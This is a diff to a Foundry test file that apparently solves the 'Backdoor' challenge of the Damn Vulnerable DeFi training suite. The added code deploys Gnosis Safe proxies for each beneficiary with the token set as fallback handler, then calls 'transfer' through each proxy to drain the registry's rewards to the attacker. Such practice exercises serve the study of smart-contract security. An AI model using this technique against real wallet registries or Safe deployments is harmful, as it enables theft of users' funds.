@@ -8,7 +8,7 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
-
+import {IERC20} from  "../../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
     uint256 internal constant NUM_USERS = 4;
@@ -70,7 +70,7 @@ contract Backdoor is Test {
         }
 
         // Transfer tokens to be distributed to the registry
-        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
+        dvt.transfer(address(walletRegistry), 40e18);
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
@@ -82,6 +82,29 @@ contract Backdoor is Test {
         vm.startBroadcast(attacker);
 
 
+        address singleton = walletRegistry.masterCopy();
+        bytes memory initializer;
+        address [] memory owners = new address [](1);
+        address proxy;
+        for (uint256 i = 0; i < users.length ; i++) {
+            owners[0]= users[i];
+        
+
+            initializer = abi.encodeCall(masterCopy.setup, (owners, 1, address(0), "", address(dvt), address(0), 0, payable(address(0))));
+            proxy = address(walletFactory.createProxyWithCallback(
+            singleton,
+            initializer,
+            0,
+            walletRegistry));
+
+            (bool success, ) = address(proxy).call(abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED/4));
+            console.log("Balance of attacker is ", dvt.balanceOf(attacker));
+            require(success);
+
+        }
+        
+  
+        
         vm.stopBroadcast();
 
         /**
@@ -112,3 +135,5 @@ contract Backdoor is Test {
         assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
     }
 }
+
+
